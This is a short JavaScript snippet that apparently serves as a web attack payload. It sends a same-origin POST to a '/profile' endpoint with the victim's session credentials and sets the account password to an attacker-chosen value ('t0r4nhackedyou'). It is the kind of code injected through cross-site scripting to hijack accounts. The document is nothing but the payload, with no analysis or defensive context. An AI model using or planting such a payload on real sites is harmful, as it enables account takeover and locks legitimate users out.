fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "password=t0r4nhackedyou",
  credentials: "same-origin"
});
